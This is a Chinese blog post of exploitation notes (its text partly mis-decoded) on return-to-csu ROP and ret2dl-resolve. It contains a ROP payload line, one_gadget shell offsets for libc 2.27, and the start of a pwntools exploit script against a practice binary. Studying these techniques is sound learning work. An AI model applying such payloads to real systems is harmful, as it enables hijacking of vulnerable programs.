<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Advance-rop | é£äº‘é˜</title>
  <meta name="keywords" content="">
  <meta name="description" content="Advance-rop | é£äº‘é˜">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="@[toc] Defcon Qual 2019 Pwn shitorrenté¢˜ç›®æè¿°  22ä¸ªé˜Ÿä¼åšå‡ºæ¥ï¼Œè¿™é¢˜è¿˜æ˜¯æœ‰ç‚¹éš¾åº¦çš„ã€‚çœ‹æ¥ä½œè€…å†™äº†ä¸€ä¸ªæ¶ˆæ¯ä¼ é€’çš„ç¨‹åºã€‚ é™„ä»¶æœ‰å¯æ‰§è¡Œç¨‹åºå’Œæºç ã€‚ åˆ†æç¨‹åº    æ·»åŠ admin pcéœ€è¦è‡ªå·±å¼€å¯ä¸€ä¸ªsocketå‘é€å­—ç¬¦ä¸² TORADMIN ã€‚ æ‰€ä»¥æˆ‘å¼€å¯äº†ä¸¤ä¸ªç½‘ç»œç¨‹åºã€‚ import socket  from time import sleep  impor">
<meta property="og:type" content="article">
<meta property="og:title" content="Defcon2019Q">
<meta property="og:url" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/index.html">
<meta property="og:site_name" content="é£äº‘é˜">
<meta property="og:description" content="@[toc] Defcon Qual 2019 Pwn shitorrenté¢˜ç›®æè¿°  22ä¸ªé˜Ÿä¼åšå‡ºæ¥ï¼Œè¿™é¢˜è¿˜æ˜¯æœ‰ç‚¹éš¾åº¦çš„ã€‚çœ‹æ¥ä½œè€…å†™äº†ä¸€ä¸ªæ¶ˆæ¯ä¼ é€’çš„ç¨‹åºã€‚ é™„ä»¶æœ‰å¯æ‰§è¡Œç¨‹åºå’Œæºç ã€‚ åˆ†æç¨‹åº    æ·»åŠ admin pcéœ€è¦è‡ªå·±å¼€å¯ä¸€ä¸ªsocketå‘é€å­—ç¬¦ä¸² TORADMIN ã€‚ æ‰€ä»¥æˆ‘å¼€å¯äº†ä¸¤ä¸ªç½‘ç»œç¨‹åºã€‚ import socket  from time import sleep  impor">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133508781.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411144618073.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145014084.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145057408.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145133505.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145207971.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145449340.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145541673.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145737954.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411145839380.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200411144248741.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133959847.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133712725.png">
<meta property="og:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133700701.png">
<meta property="article:published_time" content="2020-04-10T16:00:00.000Z">
<meta property="article:modified_time" content="2020-04-11T07:10:19.743Z">
<meta property="article:author" content="æ«äº‘æ">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Defcon">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://primelyw.github.io/2020/04/11/Defcon2019Q/image-20200409133508781.png">


<link rel="icon" href="/img/mac.png">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/github.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.0.1" ></script>

<meta name="generator" content="Hexo 4.2.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value="">
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar2.jpg" />
</a>
<div class="author">
    <span>æ«äº‘æ</span>
</div>

<div class="icon">
    
</div>



<a class="more-menus">æ›´å¤šèœå•</a>


<ul>
    <li><div class="all active">å…¨éƒ¨æ–‡ç« </div></li>
    
        
            <li><div data-rel="CTF">CTF</div></li>
        
    
        
            <li><div data-rel="Fuzz">Fuzz</div></li>
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/">å…³äº</a><a style="width: 50%"  class="friends">å‹é“¾</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="20">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        å‹æƒ…é“¾æ¥
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://blog.plusls.com/">å¸ˆçˆ¶</a></li>
            
            <li><a target="_blank" href="https://blog.xhyh.best/">æ½‡æ™—å®‡æµ©</a></li>
            
            <li><a target="_blank" href="http://pzhxbz.cn/">pzhxbz</a></li>
            
            <li><a target="_blank" href="https://evi0s.com/">evi0s</a></li>
            
            <li><a target="_blank" href="https://enivs0rt.github.io/">enivS0rt</a></li>
            
            <li><a target="_blank" href="https://me.csdn.net/getsum">SuperGate</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode === 13){return false;}">
        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">Pwn</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CTF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CVE</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">Defcon</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">fuzz</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">afl</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <nav id="title-list-nav">
        
        <a  class="CTF "
           href="/2020/04/11/Defcon2019Q/"
           data-tag="Pwn,CTF,Defcon"
           data-author="" >
            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
            <span class="post-date" title="2020-04-11 00:00:00">2020/04/11</span>
        </a>
        
        <a  class="Fuzz "
           href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/"
           data-tag="fuzz,afl"
           data-author="" >
            <span class="post-title" title="AFLåŸºç¡€">AFLåŸºç¡€</span>
            <span class="post-date" title="2020-04-10 12:35:49">2020/04/10</span>
        </a>
        
        <a  class=""
           href="/2020/04/05/CVEs/"
           data-tag="Pwn,CVE"
           data-author="" >
            <span class="post-title" title="CVEs">CVEs</span>
            <span class="post-date" title="2020-04-05 20:45:40">2020/04/05</span>
        </a>
        
        <a  class="CTF "
           href="/2020/02/10/NullConCTF2020/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="NullConCTF2020">NullConCTF2020</span>
            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
        </a>
        
        <a  class="CTF "
           href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="å¼ºç½‘æ¯2019">å¼ºç½‘æ¯2019</span>
            <span class="post-date" title="2020-01-16 02:06:12">2020/01/16</span>
        </a>
        
        <a  class="CTF "
           href="/2019/11/30/N1CTF2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="N1CTF2019">N1CTF2019</span>
            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
        </a>
        
        <a  class="CTF "
           href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="å®‰æ´µæ¯2019">å®‰æ´µæ¯2019</span>
            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/2019/11/07/Advance-rop/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Advance-rop">Advance-rop</span>
            <span class="post-date" title="2019-11-07 09:50:48">2019/11/07</span>
        </a>
        
        <a  class=""
           href="/2019/10/20/heap_details/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="heap_details">heap_details</span>
            <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
        </a>
        
        <a  class="CTF "
           href="/2019/10/12/RoarCTF-2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="RoarCTF-2019">RoarCTF-2019</span>
            <span class="post-date" title="2019-10-12 00:00:00">2019/10/12</span>
        </a>
        
        <a  class=""
           href="/2019/07/22/Pwner/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="pwner">pwner</span>
            <span class="post-date" title="2019-07-22 00:00:00">2019/07/22</span>
        </a>
        
        <a  class=""
           href="/2019/07/18/tmux/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="tmux">tmux</span>
            <span class="post-date" title="2019-07-18 00:00:00">2019/07/18</span>
        </a>
        
        <a  class=""
           href="/2019/07/11/server_misc/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="server_misc">server_misc</span>
            <span class="post-date" title="2019-07-11 00:00:00">2019/07/11</span>
        </a>
        
        <a  class=""
           href="/2019/07/07/git_handbook/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="git handbook">git handbook</span>
            <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
        </a>
        
        <a  class=""
           href="/2019/05/26/assembly/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="assembly">assembly</span>
            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
        </a>
        
        <a  class=""
           href="/2019/05/10/pwning/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="pwning">pwning</span>
            <span class="post-date" title="2019-05-10 00:00:00">2019/05/10</span>
        </a>
        
        <a  class=""
           href="/2019/05/01/finance/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="finance">finance</span>
            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
        </a>
        
        <a  class=""
           href="/2019/04/30/elf_protector/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="elf_protector">elf_protector</span>
            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
        </a>
        
        <a  class=""
           href="/2019/04/30/shellcode/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="shellcode">shellcode</span>
            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
        </a>
        
        <a  class="CTF "
           href="/2019/04/29/StarCTF/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="StarCTF">StarCTF</span>
            <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-Advance-rop" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">Advance-rop</h1>
    
    <div class="article-meta">
        
        
        
        
    </div>
    <div class="article-meta">
        
        åˆ›å»ºæ—¶é—´:<time class="date" title='æ›´æ–°æ—¶é—´: 2020-03-28 19:14:17'>2019-11-07 09:50</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            é˜…è¯»:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rop"><span class="toc-text">rop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#return2csu"><span class="toc-text">return2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ†æ"><span class="toc-text">åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-payload"><span class="toc-text">attack__payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dl-run-time-resloved"><span class="toc-text">ret2dl_run_time_resloved</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æºç "><span class="toc-text">æºç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#important-section"><span class="toc-text">important section</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#plt-plt-got"><span class="toc-text">.plt | .plt.got</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rel-plt"><span class="toc-text">.rel.plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#got-got-plt"><span class="toc-text">.got | .got.plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynsym-dynstr"><span class="toc-text">.dynsym | .dynstr</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¼æ´åˆ©ç”¨ï¼Œå®ç°æ— leakçš„getshell"><span class="toc-text">æ¼æ´åˆ©ç”¨ï¼Œå®ç°æ— leakçš„getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ†æç¨‹åº-â€“-bof-out"><span class="toc-text">åˆ†æç¨‹åº â€“ bof.out</span></a></li></ol></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h1><p>ä¸€ç¯‡å¤è€çš„ç¬”è®°ï¼Œå­˜æ¡£ã€‚</p>
<h2 id="return2csu"><a href="#return2csu" class="headerlink" title="return2csu"></a>return2csu</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code>.text:00000000004005A0 ; void _libc_csu_init(void)
.text:00000000004005A0                 public __libc_csu_init
.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16â†‘o
.text:00000000004005A0
.text:00000000004005A0 var_30          = qword ptr -30h
.text:00000000004005A0 var_28          = qword ptr -28h
.text:00000000004005A0 var_20          = qword ptr -20h
.text:00000000004005A0 var_18          = qword ptr -18h
.text:00000000004005A0 var_10          = qword ptr -10h
.text:00000000004005A0 var_8           = qword ptr -8
.text:00000000004005A0
.text:00000000004005A0 ; __unwind {
.text:00000000004005A0                 mov     [rsp+var_28], rbp
.text:00000000004005A5                 mov     [rsp+var_20], r12
.text:00000000004005AA                 lea     rbp, cs:600E24h
.text:00000000004005B1                 lea     r12, cs:600E24h
.text:00000000004005B8                 mov     [rsp+var_18], r13
.text:00000000004005BD                 mov     [rsp+var_10], r14
.text:00000000004005C2                 mov     [rsp+var_8], r15
.text:00000000004005C7                 mov     [rsp+var_30], rbx
.text:00000000004005CC                 sub     rsp, 38h
.text:00000000004005D0                 sub     rbp, r12
.text:00000000004005D3                 mov     r13d, edi
.text:00000000004005D6                 mov     r14, rsi
.text:00000000004005D9                 sar     rbp, 3
.text:00000000004005DD                 mov     r15, rdx
.text:00000000004005E0                 call    _init_proc
.text:00000000004005E5                 test    rbp, rbp
.text:00000000004005E8                 jz      short loc_400606
.text:00000000004005EA                 xor     ebx, ebx
.text:00000000004005EC                 nop     dword ptr [rax+00h]
.text:00000000004005F0
.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64â†“j
.text:00000000004005F0                 mov     rdx, r15
.text:00000000004005F3                 mov     rsi, r14
.text:00000000004005F6                 mov     edi, r13d
.text:00000000004005F9                 call    qword ptr [r12+rbx*8]
.text:00000000004005FD                 add     rbx, 1
.text:0000000000400601                 cmp     rbx, rbp
.text:0000000000400604                 jnz     short loc_4005F0
.text:0000000000400606
.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48â†‘j
.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]
.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]
.text:0000000000400610                 mov     r12, [rsp+38h+var_20]
.text:0000000000400615                 mov     r13, [rsp+38h+var_18]
.text:000000000040061A                 mov     r14, [rsp+38h+var_10]
.text:000000000040061F                 mov     r15, [rsp+38h+var_8]
.text:0000000000400624                 add     rsp, 38h
.text:0000000000400628                 retn
.text:0000000000400628 ; } // starts at 4005A0
.text:0000000000400628 __libc_csu_init endp</code></pre><h3 id="attack-payload"><a href="#attack-payload" class="headerlink" title="attack__payload"></a>attack__payload</h3><pre><code class="python">
#æ„é€  functionA(a,b,c);
payload=&#39;a&#39;*offset+flat([csu_ret2,0x0,0,1,call_tar,edi,rsi,rdx,csu_ret1])+flat([0,0,0,0,0,0,0,main_addr])</code></pre>
<pre><code>onegadget libc.so.6-2.27 
0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
constraints:
  rsp &amp; 0xf == 0
  rcx == NULL

0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL</code></pre><h2 id="ret2dl-run-time-resloved"><a href="#ret2dl-run-time-resloved" class="headerlink" title="ret2dl_run_time_resloved"></a>ret2dl_run_time_resloved</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre><code>cat ./elf/dl-runtime.c

/* This function is called through a special trampoline from the PLT the
   first time each PLT entry is called.  We must perform the relocation
   specified in the PLT of the given shared object, and return the resolved
   function address to the trampoline, which will restart the original call
   to that address.  Future calls will bounce directly from the PLT to the
   function.  */


_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we&#39;re really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don&#39;t look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)
    {
      const ElfW(Half) *vernum =
        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;
      version = &amp;l-&gt;l_versions[ndx];
      if (version-&gt;hash == 0)
        version = NULL;
    }

      /* We need to keep the scope around so do some locking.  This is
     not necessary for objects which cannot be unloaded or when
     we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
    {
      THREAD_GSCOPE_SET_FLAG ();
      flags |= DL_LOOKUP_GSCOPE_LOCK;
    }

#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif

      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,
                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
    THREAD_GSCOPE_RESET_FLAG ();

#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif

      /* Currently result contains the base load address (or link map)
     of the object that defines sym.  Now add in the symbol
     offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
                   sym ? (LOOKUP_VALUE_ADDRESS (result)
                      + sym-&gt;st_value) : 0);
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
     address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);
      result = l;
    }

  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);

  if (sym != NULL
      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;

  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); 
}</code></pre><h3 id="important-section"><a href="#important-section" class="headerlink" title="important section"></a>important section</h3><pre><code>prime@pubuntu âœ ğŸ­ ret2dl-resolve readelf -S bof</code></pre><p><img src="/2019/11/07/Advance-rop/image-20191111164235325.png" alt="image-20191111164235325"></p>
<pre><code>#dynamic-linked important section

.rel.plt
.plt 
.plt.got 

.got 
.got.plt 

.dynsym
.dynstr</code></pre><p>What does it look like? Letâ€™s read ELF.</p>
<pre><code>prime@pubuntu âœ ğŸ­ ret2dl-resolve file bof
bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=fbf836d803f75a6c9b6e0993bea8a800e097a53f, not stripped</code></pre><h4 id="plt-plt-got"><a href="#plt-plt-got" class="headerlink" title=".plt | .plt.got"></a><code>.plt</code> | <code>.plt.got</code></h4><p><img src="/2019/11/07/Advance-rop/image-20191111215815685.png" alt="image-20191111215815685"></p>
<p><img src="/2019/11/07/Advance-rop/image-20191111215824423.png" alt="image-20191111215824423"></p>
<p><code>.plt</code> è¿‡ç¨‹é“¾æ¥è¡¨ï¼ŒåŠ¨æ€é“¾æ¥çš„å‡½æ•°éƒ½é€šè¿‡è¿™ä¸ªè°ƒç”¨å…¥å£ï¼Œæ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª <code>rel_offset</code> ï¼Œå…¶ä¸­ <code>write</code> çš„é‡å®šå‘åç§»ä¸º<code>0x20</code></p>
<h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a><code>.rel.plt</code></h4><p><img src="/2019/11/07/Advance-rop/image-20191111162736318.png" alt="image-20191111162736318"></p>
<pre><code>typedef struct {
Elf32_Addr r_offset;    // å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ­¤å€¼ä¸ºè™šæ‹Ÿåœ°å€ï¼Œ4å­—èŠ‚
Elf32_Word r_info;      // ç¬¦å·è¡¨ç´¢å¼• ï¼Œ4å­—èŠ‚
} Elf32_Rel;</code></pre><p><code>write.ELF32_Rel = {0x804A01C, 0x607}</code> </p>
<h4 id="got-got-plt"><a href="#got-got-plt" class="headerlink" title=".got | .got.plt"></a><code>.got</code> | <code>.got.plt</code></h4><p><code>.got</code> ä¿å­˜äº†<code>åŠ¨æ€é“¾æ¥</code> çš„å˜é‡åœ°å€ï¼Œ<code>.got.plt</code> å­˜åŠ¨æ€é“¾æ¥å‡½æ•°åœ°å€ã€‚</p>
<p><img src="/2019/11/07/Advance-rop/image-20191111163010436.png" alt="image-20191111163010436"></p>
<p><img src="/2019/11/07/Advance-rop/image-20191111163613505.png" alt="image-20191111163613505"></p>
<h4 id="dynsym-dynstr"><a href="#dynsym-dynstr" class="headerlink" title=".dynsym | .dynstr"></a><code>.dynsym</code> | <code>.dynstr</code></h4><p><code>.dynsym</code> ä¿å­˜äº†åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨ï¼Œ<code>.dynstr</code> ä¿å­˜äº†åŠ¨æ€é“¾æ¥å­—ç¬¦ä¸²ã€‚</p>
<p><img src="/2019/11/07/Advance-rop/image-20191111164151157.png" alt="image-20191111164151157"></p>
<p><img src="/2019/11/07/Advance-rop/image-20191111164200594.png" alt="image-20191111164200594"></p>
<pre><code>typedef struct
{
Elf32_Word st_name;     // Symbol name(string tbl index) ,4bytes
Elf32_Addr st_value;    // Symbol value ,4bytes
Elf32_Word st_size;     // Symbol size 4bytes
unsigned char st_info;  // Symbol type and binding ,1bytes
unsigned char st_other; // Symbol visibility under glibc&gt;=2.2 ,1bytes
Elf32_Section st_shndx; // Section index ,2bytes
} Elf32_Sym</code></pre><p><img src="/2019/11/07/Advance-rop/image-20191111214121700.png" alt="image-20191111214121700"></p>
<p><code>write.ELF32_Sym={0x4c,0,0,0x12,0,0}</code> , <code>st_name=0x4c</code> </p>
<pre><code>prime@pubuntu âœ ğŸ­ ret2dl-resolve readelf -x .dynsym  bof

Hex dump of section &#39;.dynsym&#39;:
  0x080481d8 00000000 00000000 00000000 00000000 ................
  0x080481e8 33000000 00000000 00000000 12000000 3...............
  0x080481f8 27000000 00000000 00000000 12000000 &#39;...............
  0x08048208 52000000 00000000 00000000 20000000 R........... ...
  0x08048218 20000000 00000000 00000000 12000000  ...............
  0x08048228 3a000000 00000000 00000000 12000000 :...............
  0x08048238 4c000000 00000000 00000000 12000000 L...............
  0x08048248 2c000000 44a00408 04000000 11001a00 ,...D...........
  0x08048258 0b000000 3c860408 04000000 11001000 ....&lt;...........
  0x08048268 1a000000 40a00408 04000000 11001a00 ....@...........</code></pre><p><img src="/2019/11/07/Advance-rop/image-20191111214217904.png" alt="image-20191111214217904"></p>
<p><img src="/2019/11/07/Advance-rop/image-20191111214340061.png" alt="image-20191111214340061"></p>
<h3 id="æ¼æ´åˆ©ç”¨ï¼Œå®ç°æ— leakçš„getshell"><a href="#æ¼æ´åˆ©ç”¨ï¼Œå®ç°æ— leakçš„getshell" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼Œå®ç°æ— leakçš„getshell"></a>æ¼æ´åˆ©ç”¨ï¼Œå®ç°æ— leakçš„getshell</h3><ul>
<li><input checked disabled type="checkbox"> å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚</li>
<li><input checked disabled type="checkbox"> æ ˆè¿ç§»åˆ°<code>bss</code> ,ä¸ºåæœŸå¸ƒå±€å†…å­˜åšå‡†å¤‡ã€‚</li>
<li><input checked disabled type="checkbox"> åˆ©ç”¨ <code>_dl_runtime_resolve</code> æœºåˆ¶å¸ƒå±€å†…å­˜<ol>
<li>åœ¨å†…å­˜ä¸­å¸ƒç½® <code>fake_rel_table</code> ã€<code>fake_sym_table</code> ã€<code>fake_str_table</code> ã€‚</li>
<li>ä¿®æ”¹ <code>rel_offset</code> ä½¿å¾—<code>Rel</code>å®šä½åˆ° <code>fake_rel_table</code> ã€‚</li>
<li>ä¿®æ”¹ <code>r_info</code> ä½¿å¾—<code>ç¬¦å·</code>å®šä½åˆ° <code>fake_sym_table</code> </li>
<li>ä¿®æ”¹ <code>st_name</code> ä½¿å¾— <code>å‡½æ•°å­—ç¬¦ä¸²</code> å®šä½åˆ° <code>fake_str_table</code></li>
</ol>
</li>
<li><input checked disabled type="checkbox"> <code>Pwned!</code></li>
</ul>
<h3 id="åˆ†æç¨‹åº-â€“-bof-out"><a href="#åˆ†æç¨‹åº-â€“-bof-out" class="headerlink" title="åˆ†æç¨‹åº â€“ bof.out"></a>åˆ†æç¨‹åº â€“ bof.out</h3><p>æˆ‘ä»¬ä»¥è°ƒç”¨<code>write</code>ä¸ºä¾‹ï¼Œå› ä¸ºå¯ä»¥è§‚å¯Ÿåˆ°å­—ç¬¦ä¸²ï¼Œè°ƒè¯•æ–¹ä¾¿ï¼Œæœ€åæŠŠå­—ç¬¦ä¸²æ¢æˆ <code>system</code> å³å¯ã€‚</p>
<p>â€¦ åæœŸæ›´æ–°</p>
<p>æœ€åexp</p>
<pre><code class="python">from pwn import * 
p=process(&#39;./bof&#39;) 
elf=ELF(&quot;./bof&quot;)
context.arch=&#39;i386&#39;
context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

read_plt=elf.plt[&#39;read&#39;]
main_func=elf.sym[&#39;main&#39;]
write_plt=elf.plt[&#39;write&#39;]
write_got=elf.got[&#39;write&#39;]
